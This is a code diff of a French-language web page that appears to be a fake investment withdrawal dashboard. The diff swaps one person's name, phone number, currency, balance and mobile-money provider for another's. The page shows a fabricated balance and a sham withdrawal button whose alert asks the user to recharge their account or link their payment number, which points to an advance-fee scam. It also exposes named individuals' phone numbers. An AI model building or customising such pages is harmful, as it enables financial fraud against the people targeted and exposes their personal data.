@@ -237,7 +237,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer le code d'accès :");
-        if (code === "2004") {
+        if (code === "1122") {
             document.body.style.display = 'block';
         } else {
             alert("Code incorrect. Accès refusé.");
@@ -251,10 +251,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 22 000 000 GNF </span>
+                <span class="balance">Solde: 280 000 F CFA </span>
                 <div class="account-info">
-                    <span id="user-name"> META ACHE </span><br>
-                    <span id="user-phone">224 625 51 52 12</span>
+                    <span id="user-name"> IPAPOULYOUBI GERAUD DAHYANN </span><br>
+                    <span id="user-phone">241 077 77 32 03</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -282,7 +282,7 @@
                 </div>
             </section>
             <section class="withdrawal-options">
-                <button id="orange-money">Retrait via Orange Money</button>
+                <button id="orange-money">Retrait via Airtel Money</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
                 <h3>Confirmer le retrait</h3>
@@ -314,17 +314,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = () => {
-                const paymentMethod = "Orange Money";
-                const accountName = "META ACHE";
-                const accountNumber = "224 625 51 52 12";
-                    withdrawalInfo.innerHTML = `${accountName}<br><br> ${accountNumber}<br><br> 22 000 000 GNF`;
+                const paymentMethod = "Airtel Money";
+                const accountName = "IPAPOULYOUBI GERAUD DAHYANN";
+                const accountNumber = "241 077 77 32 03";
+                    withdrawalInfo.innerHTML = `${accountName}<br><br> ${accountNumber}<br><br> 280 000 F CFA`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', setWithdrawalInfo);
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Veuillez recharger votre compte pour la finalisation de transfert et recevoir vos benefices dans les 5 minutes');
+                alert('Veuillez relier votre numero de paiement au serveur pour la finalisation du transfert.');
                 withdrawalForm.style.display = 'none';
             });
 
